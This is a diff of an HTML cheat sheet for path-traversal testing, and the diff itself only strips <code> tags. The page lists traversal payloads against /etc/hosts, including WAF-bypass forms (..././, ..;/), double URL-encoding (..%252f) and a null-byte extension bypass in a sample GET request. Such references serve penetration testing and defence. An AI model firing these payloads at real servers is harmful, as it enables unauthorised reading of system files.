@@ -16,8 +16,6 @@
      
 <h2>1. GENERAL COMMANDS</h2>  
 
-<code>
-
 INFO:  Collection of commands to use when testing for path/directory traversal.<br><br>
 
 C1: ../../../../etc/hosts<br>
@@ -34,13 +32,9 @@ Try: <br><br>
 WAF bypass<br><br>
 
 C4: ..././etc/hosts<br>
-C5: ..;/etc/hosts<br>
-
-</code>          
+C5: ..;/etc/hosts<br>        
 
 <h2>2. URL-DECODING</h2> 
-
-<code>
 
 NOTE:<br> <br>
 - It is important to encode one, two, three times, it will be slow but it is important to test if exist any encoding that can be 
@@ -56,13 +50,9 @@ encoded 2 times<br><br>
 
 C2: ..%252f..%252f..%252fetc/hosts
 
-</code>
-
 <h2>3. VALIDATIONS</h2>  
 
 <u>SPECIFIC PATHS</u><br><br>
-
-<code>
 
 SAMPLE:<br><br>
 
@@ -92,10 +82,6 @@ images, files and more.
 
 SAMPLE: GET /image?filename=../../../etc/hosts%00.png HTTP/2<br><br>
 
-</code>     
-
-<code>
-
 NOTE:  <br><br>
 1. All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, SNIPER ATTACK! 
 (or similar). Also, invert the symbol, use backslash and try it. ["..&bsol;&quot;]<br>
@@ -104,9 +90,7 @@ NOTE:  <br><br>
 
 CHECK THE FOLLOWING LINK, >>> FILE SYSTEM >>> It can be used to check valuable files per OS. 
 
-</code>
     </article>
   </main>
-
 </body>
 </html>
